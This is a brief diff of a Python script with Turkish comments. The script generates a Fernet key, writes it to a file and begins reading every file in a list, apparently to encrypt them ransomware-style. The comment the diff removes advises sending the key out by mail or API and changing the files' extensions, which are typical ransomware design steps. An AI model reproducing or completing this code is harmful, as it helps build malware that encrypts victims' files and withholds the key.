@@ -15,9 +15,8 @@ key = Fernet.generate_key()
 
 print(key)
 
-with open("generatedkey.key", "wb") as generatedkey: #gerçekte bu satırlar yazılmaz mail ya da api
-    generatedkey.write(key)    # yoluyla şifre gönderilir (içerik dışında uzantıyıda değiştirebilirsin)
-
+with open("generatedkey.key", "wb") as generatedkey: 
+    generatedkey.write(key)    
 for file in file_list:
     with open(file, "rb") as the_file:
         contents = the_file.read()
